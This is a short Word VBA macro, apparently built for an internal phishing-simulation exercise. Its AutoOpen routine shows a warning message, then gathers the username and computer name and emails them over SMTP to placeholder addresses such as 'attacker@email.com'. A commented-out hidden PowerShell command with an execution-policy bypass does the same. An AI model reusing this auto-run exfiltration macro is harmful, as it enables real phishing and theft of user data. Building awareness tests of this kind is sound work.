
Public Sub AutoOpen()
     MsgBox "This is a simulated phishing attack. If this had been real, your PC would have been compromised. Never enable content / Macros on any word or excell document."
     GetUserName = Environ$("username")
     GeUserName2 = Application.UserName
     sHostName = Environ$("computername")
     'MsgBox GetUserName
     
     '
     'Dim exec As String
     '
     'exec = "powershell.exe -NoP -W Hidden -Exec Bypass -Command ""$data = $env:UserName + ' emabled the macros on ' +  $env:ComputerName; Send-MailMessage -To 'michael.adcock@uwtlogistics.com' -From 'phishing@uwtlogistics.com'  -Subject 'Powershell Test' -Body $data  -SmtpServer 'mail.smtp2go.com'"""
     '
     'Shell (exec)
 
        
        Dim objMessage, objConfig, fields
    Set objMessage = New CDO.Message
    Set objConfig = New CDO.Configuration
    Set fields = objConfig.fields
    With fields
        .Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
        .Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "mail.smtp_server.com"
        .Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
        '.Item("http://schemas.microsoft.com/cdo/configuration/sendtls") = True
        .Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
        .Update
    End With
    Set objMessage.Configuration = objConfig
    
    With objMessage
        .Subject = "Test Message"
          .From = "phishingtest@email.com"
        .To = "attacker@email.com; attacker@email.com"
        .HTMLBody = "user : " + GetUserName + "( " + GeUserName2 + " )" + " enabled Maros in Phishing Word Doc on PC : " + sHostName
    End With
    objMessage.Send
 
     
     
End Sub


